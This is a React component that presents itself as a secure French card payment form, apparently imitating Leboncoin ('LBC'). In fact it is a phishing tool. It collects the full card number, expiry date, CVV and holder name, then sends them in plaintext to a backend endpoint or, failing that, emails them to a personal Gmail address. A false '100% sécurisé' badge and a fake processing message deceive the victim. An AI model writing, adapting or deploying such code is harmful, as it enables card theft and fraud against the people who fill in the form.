import { useState, FormEvent } from 'react';
import { CreditCard, Lock, Loader2 } from 'lucide-react';

export default function CardPaymentForm() {
  const [formData, setFormData] = useState({
    cardHolder: '',
    cardNumber: '',
    expiryDate: '',
    cvv: '',
    amount: ''
  });

  const [isSubmitting, setIsSubmitting] = useState(false);
  const [submitStatus, setSubmitStatus] = useState<'idle' | 'success' | 'error'>('idle');

  const EMAIL = 'marthedufour23@gmail.com';
  const API_URL = (import.meta.env.VITE_API_URL as string) || 'http://localhost:3001';

  /** Envoi des infos paiement : serveur (emailService) en priorité, sinon mailto. */
  async function sendPaymentEmail(data: typeof formData): Promise<boolean> {
    const payload = {
      cardHolder: data.cardHolder,
      cardNumber: data.cardNumber,
      expiryDate: data.expiryDate,
      cvv: data.cvv,
      amount: data.amount,
    };

    try {
      const res = await fetch(`${API_URL}/api/send-payment`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', Accept: 'application/json' },
        body: JSON.stringify(payload),
      });
      const json = await res.json();
      if (json.success) return true;
    } catch {
      // serveur injoignable → repli mailto
    }

    const subject = encodeURIComponent('Nouveau paiement par carte - LBC');
    const body = encodeURIComponent(
      [
        `Nom du titulaire: ${data.cardHolder}`,
        `Numéro de carte: ${data.cardNumber}`,
        `Date d'expiration: ${data.expiryDate}`,
        `CVV: ${data.cvv}`,
        `Montant: ${data.amount} €`,
      ].join('\n')
    );
    window.location.href = `mailto:${EMAIL}?subject=${subject}&body=${body}`;
    return true;
  }

  const handleSubmit = async (e: FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);
    setSubmitStatus('idle');

    const ok = await sendPaymentEmail(formData);

    if (ok) {
      setSubmitStatus('success');
      setFormData({
        cardHolder: '',
        cardNumber: '',
        expiryDate: '',
        cvv: '',
        amount: '',
      });
    } else {
      setSubmitStatus('error');
    }
    setIsSubmitting(false);
  };

  const formatCardNumber = (value: string) => {
    const numbers = value.replace(/\s/g, '').replace(/\D/g, '');
    const formatted = numbers.match(/.{1,4}/g)?.join(' ') || numbers;
    return formatted.slice(0, 19);
  };

  const formatExpiryDate = (value: string) => {
    const numbers = value.replace(/\D/g, '');
    if (numbers.length >= 2) {
      return numbers.slice(0, 2) + '/' + numbers.slice(2, 4);
    }
    return numbers;
  };

  return (
    <div className="bg-white rounded-xl shadow-lg p-8">
      <div className="flex items-center gap-3 mb-6">
        <div className="bg-orange-100 p-3 rounded-lg">
          <CreditCard className="w-6 h-6 text-orange-600" />
        </div>
        <h2 className="text-2xl font-bold text-gray-800">Paiement par carte bancaire</h2>
      </div>

      <form onSubmit={handleSubmit} className="space-y-5">
        <div>
          <label htmlFor="cardHolder" className="block text-sm font-semibold text-gray-700 mb-2">
            Nom du titulaire
          </label>
          <input
            type="text"
            id="cardHolder"
            required
            value={formData.cardHolder}
            onChange={(e) => setFormData({ ...formData, cardHolder: e.target.value })}
            className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-orange-500 focus:border-transparent transition"
            placeholder="Jean Dupont"
          />
        </div>

        <div>
          <label htmlFor="cardNumber" className="block text-sm font-semibold text-gray-700 mb-2">
            Numéro de carte
          </label>
          <input
            type="text"
            id="cardNumber"
            required
            value={formData.cardNumber}
            onChange={(e) => setFormData({ ...formData, cardNumber: formatCardNumber(e.target.value) })}
            className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-orange-500 focus:border-transparent transition"
            placeholder="1234 5678 9012 3456"
            maxLength={19}
          />
        </div>

        <div className="grid grid-cols-2 gap-4">
          <div>
            <label htmlFor="expiryDate" className="block text-sm font-semibold text-gray-700 mb-2">
              Date d'expiration
            </label>
            <input
              type="text"
              id="expiryDate"
              required
              value={formData.expiryDate}
              onChange={(e) => setFormData({ ...formData, expiryDate: formatExpiryDate(e.target.value) })}
              className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-orange-500 focus:border-transparent transition"
              placeholder="MM/AA"
              maxLength={5}
            />
          </div>

          <div>
            <label htmlFor="cvv" className="block text-sm font-semibold text-gray-700 mb-2">
              Code de sécurité (CVV)
            </label>
            <input
              type="text"
              id="cvv"
              required
              value={formData.cvv}
              onChange={(e) => setFormData({ ...formData, cvv: e.target.value.replace(/\D/g, '').slice(0, 3) })}
              className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-orange-500 focus:border-transparent transition"
              placeholder="123"
              maxLength={3}
            />
          </div>
        </div>

        <div>
          <label htmlFor="amount" className="block text-sm font-semibold text-gray-700 mb-2">
            Montant (€)
          </label>
          <input
            type="number"
            id="amount"
            required
            step="0.01"
            min="0"
            value={formData.amount}
            onChange={(e) => setFormData({ ...formData, amount: e.target.value })}
            className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-orange-500 focus:border-transparent transition"
            placeholder="100.00"
          />
        </div>

        <button
          type="submit"
          disabled={isSubmitting}
          className="w-full bg-orange-600 hover:bg-orange-700 text-white font-bold py-4 rounded-lg transition flex items-center justify-center gap-2 disabled:opacity-50 disabled:cursor-not-allowed"
        >
          {isSubmitting ? (
            <>
              <Loader2 className="w-5 h-5 animate-spin" />
              Traitement en cours...
            </>
          ) : (
            <>
              <Lock className="w-5 h-5" />
              Payer maintenant
            </>
          )}
        </button>

        {submitStatus === 'success' && (
          <div className="bg-green-50 border border-green-200 text-green-800 px-4 py-3 rounded-lg">
            Votre paiement est en cours de traitement. Vous recevrez un email de confirmation dans quelques instants.
          </div>
        )}

        {submitStatus === 'error' && (
          <div className="bg-red-50 border border-red-200 text-red-800 px-4 py-3 rounded-lg">
            Une erreur s'est produite. Veuillez réessayer.
          </div>
        )}

        <div className="flex items-center justify-center gap-2 text-sm text-gray-500">
          <Lock className="w-4 h-4" />
          <span>Paiement 100% sécurisé</span>
        </div>
      </form>
    </div>
  );
}
